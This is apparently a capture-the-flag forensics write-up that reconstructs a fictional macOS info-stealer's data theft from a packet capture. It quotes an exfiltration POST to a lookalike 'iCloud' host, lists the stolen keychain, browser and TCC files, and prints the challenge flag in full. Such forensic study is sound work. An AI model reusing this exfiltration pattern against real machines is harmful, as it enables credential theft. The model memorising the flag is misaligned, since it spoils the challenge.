# keychain-crumbs

| | |
|---|---|
| **Category** | Forensics |
| **Points** | 200 |
| **Author** | Kshitij Raj |
| **Artifact** | `capture.zip` (`capture.pcap`, 738 packets) |
| **Flag** | `InIt{k3ych4in_crumbs_l34k3d_0v3r_pl41n_http}` |

## Challenge

> Marcus Reid, a senior developer at Tanvoro Systems, installed a "cracked" copy of a paid productivity app. Minutes later his MacBook began reaching out to an unfamiliar host posing as an Apple iCloud service. An info-stealer swept his home directory (browser credentials, login Keychain, system data) and shipped it to an attacker-controlled server over plaintext HTTP.
>
> You have one artifact, the packet capture. Reconstruct what the stealer exfiltrated, profile the compromised host, and recover the secret the attackers accidentally leaked in the clear.

## TL;DR

The stealer POSTed a base64 ZIP to `update.icloud-sync.cc` in 58 out-of-order JSON chunks. Reassemble by `id`, decode, unzip, then base64-decode the `backup-key` entry in the keychain dump.

## Solution

### 1. Triage the capture

No Wireshark or scapy was available, so I wrote a small pcap parser with TCP stream reassembly.

- Victim: `192.168.1.24`
- Suspicious DNS: `update.icloud-sync.cc` (`185.199.111.153`), a lookalike "iCloud" domain
- Noise: HTTP to `example.com`, `www.apple.com/support`, and lookups for `github.com` and `ocsp.apple.com`

### 2. Find the exfiltration channel

58 separate HTTP POSTs go to `update.icloud-sync.cc/api/collect`, one TCP connection each, with JSON bodies:

```http
POST /api/collect HTTP/1.1
Host: update.icloud-sync.cc
Content-Type: application/json

{"id": 35, "part": "HpBYkpGUWBQvIB7vFgEWyC/OrACJeuaFZJbkpC5i477EzsHJ"}
```

The chunks are sent **out of order**, but each carries an `id` from 0 to 57 and none are missing.

### 3. Reassemble and decode

```python
ch  = {j["id"]: j["part"] for j in posts}      # JSON body of each POST
b64 = "".join(ch[i] for i in sorted(ch))        # 2776 chars
raw = base64.b64decode(b64)                     # 2080 bytes, starts with PK\x03\x04
open("exfil.zip", "wb").write(raw)
```

The result is a ZIP of the stolen files:

```text
exfil/system_profiler.txt                    macOS 15.2, M1 Pro, host MARCUS-MBP, user mreid
exfil/Library/Keychains/keychain_dump.txt    login keychain
exfil/Safari/browsing_data.json              saved login + cookie
exfil/Library/Application Support/com.apple.TCC/TCC.db
exfil/Library/Preferences/com.apple.finder.plist
```

### 4. The leaked secret

The keychain dump lists several entries (GitHub, ProtonMail, iCloud, Wi-Fi). One generic-password entry is named `backup-key` (account `mreid`), and its data is base64:

```console
$ echo 'SW5JdHtrM3ljaDRpbl9jcnVtYnNfbDM0azNkXzB2M3JfcGw0MW5faHR0cH0=' | base64 -d
InIt{k3ych4in_crumbs_l34k3d_0v3r_pl41n_http}
```

## Impact summary

Keychain credentials (GitHub, ProtonMail, iCloud, Wi-Fi), a Safari AWS login, a Slack cookie, the TCC database and the host profile all left the network over plaintext HTTP to a lookalike "iCloud" domain.

## Flag

```
InIt{k3ych4in_crumbs_l34k3d_0v3r_pl41n_http}
```

## Takeaways

- Chunked, base64-encoded JSON over HTTP is trivially reassembled from a capture once you sort by the sequence field.
- Keychain "data" fields in a dump are plaintext, and the attackers' own plaintext C2 is what exposed them.
